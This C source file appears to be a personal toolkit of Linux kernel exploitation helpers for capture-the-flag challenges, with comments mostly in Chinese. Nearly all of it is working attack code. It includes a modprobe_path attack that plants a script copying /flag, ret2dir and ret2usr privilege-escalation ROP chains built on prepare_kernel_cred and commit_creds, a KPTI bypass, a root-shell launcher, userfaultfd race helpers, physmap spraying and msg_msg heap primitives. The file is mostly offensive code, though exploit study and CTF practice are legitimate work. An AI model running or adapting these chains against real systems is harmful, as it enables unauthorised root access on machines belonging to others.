#define _GNU_SOURCE

#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <poll.h>
#include <sched.h>
#include <linux/userfaultfd.h>
#include <math.h>

// ! knowledge
// ? kaslr offset
/*
在未开启KASLR保护机制时，内核代码段的基址为 0xffffffff81000000 ，direct mapping area 的基址为 0xffff888000000000

*/
// ? modprobe_path数据流攻击
/*
* 如果能够修改这个全局变量就无敌
找寻方法：
cat /proc/kallsyms |grep __request_module
x/50i 0xffffffff81095a00  // __request_module addr
*/
void modprobe_path_attack()
{
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fl");
    system("chmod +x /tmp/fl");

    //changed modprobe_path
    system("/tmp/fl");
}
// ? slide pt_regs 
/*
* 用户态的栈帧会有一部分保存，第一次rip之后可以考虑slide到pt_regs进一步攻击
    asm volatile (
        "mov $0xbeefdead, %%r15\n\t"
        "mov $0x11111111, %%r14\n\t"
        "mov $0x22222222, %%r13\n\t"
        "mov $0x33333333, %%r12\n\t"
        "mov $0x44444444, %%rbp\n\t"  // 临时修改 rbp
        "mov $0x55555555, %%rbx\n\t"
        "mov $0x66666666, %%r11\n\t"
        "mov $0x77777777, %%r10\n\t"
        "mov %0, %%r9\n\t"            // 将 pop_rsp_ret 加载到 r9
        "mov %1, %%r8\n\t"            // 将 try_hit 加载到 r8
        "mov $0x10, %%rax\n\t"
        "mov $0xaaaaaaaa, %%rcx\n\t"
        "mov %1, %%rdx\n\t"           // 再次加载 try_hit 到 rdx
        "mov $0x1bf52, %%rsi\n\t"
        "mov $3, %%rdi\n\t"
        "syscall\n\t"
        "pop %%rbp\n\t"               // 恢复 rbp 的值
        :
        : "r"(pop_rsp), "r"(try_hit)  // 输入操作数
    );
*/

// ! Gadgets
long long add_rsp_0xa0_pop4_ret;
long long pop_rdi;
long long prepare_kernel_cred;
long long pop_rsi;
long long pop_rcx;
long long mov_rax2rdi_cmp_pop_rbp_ret;
long long commit_creds;
long long swapgs_restore_regs_and_return_to_usermode;
long long ret;

// ! common


void errExit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

void success(char * msg)
{
    printf("[+] Success: %s\n", msg);
}

// ? bind cpu
/* to run the exp on the specific core only */
void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

// ? get_shell
/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

// ? before enter kernel save status
/* userspace status saver */
unsigned long user_cs, user_ss, user_eflags, user_sp;
void save_status() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
        : 
        : "memory"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
    printf("user_cs: 0x%lx\n user_ss: 0x%lx\n user_sp: 0x%lx\n user_eflags: 0x%lx\n");
}

// ! ret2usr

// ? kpti ROP bypass execute swapgs and iretq
// * need to change cr3 to user cr3
/*
    ROP[i++] = kpti_bypass + vm_linux_base; // 0x12

    for(int j = 0; j < 16; j++)
        ROP[i++] = 0; // 0x10
    ROP[i++] = (long long)get_shell; // for test
    ROP[i++] = user_cs;
    ROP[i++] = user_eflags;
    ROP[i++] = user_sp;
    ROP[i++] = user_ss; // 0x5

*/

// ? ret2usr when disabled smap/smep
// * used when smep&smap&kpti is off
void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds)
{
    void *(*prepare_kernel_cred_ptr)(void *) = 
                                         (void *(*)(void*)) prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = (int (*)(void*)) commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

// ? smap/smep ROP bypass to make cr4 = 0x6f0 (obsaled)
// * bypass cr4 protection
/*
find gadgets like mov cr4, rax ; push rcx ; popfq ; ret

*/

// ! ret2dir
// * by physpray to dma, we could use ROP there
// * the key is to slide slide slide

void ret2dir_rop(size_t *phymem){
    int i = 0;
    /*
    slide into pt regs
    0x80 为add_rsp_0x70_pop2_ret
    0xa0 为ret
    0xdeadbeef
    */
    for(; i < floor(0x60 / 8); i++)
        phymem[i] = add_rsp_0xa0_pop4_ret;
    for(; i < floor((0x60+0xa0) / 8); i ++){
        phymem[i] = ret;
    }
    phymem[i++] = pop_rdi;
    phymem[i++] = 0;
    phymem[i++] = prepare_kernel_cred;
    phymem[i++] = pop_rsi;
    phymem[i++] = 0;
    phymem[i++] = pop_rcx;
    phymem[i++] = 0;
    phymem[i++] = mov_rax2rdi_cmp_pop_rbp_ret;
    phymem[i++] = 0;
    phymem[i++] = commit_creds;
    phymem[i++] = swapgs_restore_regs_and_return_to_usermode;
    for(int j = 0; j < 16; j++)
        phymem[i++] = 0; // 0x10
    phymem[i++] = (long long)get_root_shell; // for test
    phymem[i++] = user_cs;
    phymem[i++] = user_eflags;
    phymem[i++] = user_sp;
    phymem[i++] = user_ss; // 0x5
}

// ! racing condition

// ? Userfaultfd
// * to like add a breakpoint make racing successful
static pthread_t monitor_thread;


long uffd;          /* userfaultfd file descriptor */
char *addr;         /* Start of region handled by userfaultfd */
unsigned long len;  /* Length of region handled by userfaultfd */
pthread_t thr;      /* ID of thread that handles page faults */
struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;
void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

// ! heap Spraying
size_t  *physmap_spray_arr[16000];
size_t page_size;
void heap_spray()
{
    page_size = sysconf(_SC_PAGESIZE);
    for(int i = 1; i < 16000; i ++){
        physmap_spray_arr[i] = (size_t *)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (!physmap_spray_arr[i])
            puts("[-] oom for physmap spray!");
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
    }
}

// ! msg_msg

struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};

// * use first to create a msg, return msqid
int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

struct msgbuf mm;
void hkbin_msg_write(int msqid, size_t len, size_t type)
{
    // * reset first
    memset(mm.mtext, 'A', len);
    mm.mtype = type;
    int result = write_msg(msqid, &mm, len, 1);
    if(result == -1){
        errExit("write_msg");
    }
    // success(mm.mtext);
}

void hkbin_msg_read(int msqid, struct msgbuf* msg, size_t len, size_t type)
{
    int result = read_msg(msqid, msg, len, 1);
    if(result == -1){
        errExit("read_msg");
    }
    // success(msg->mtext);
}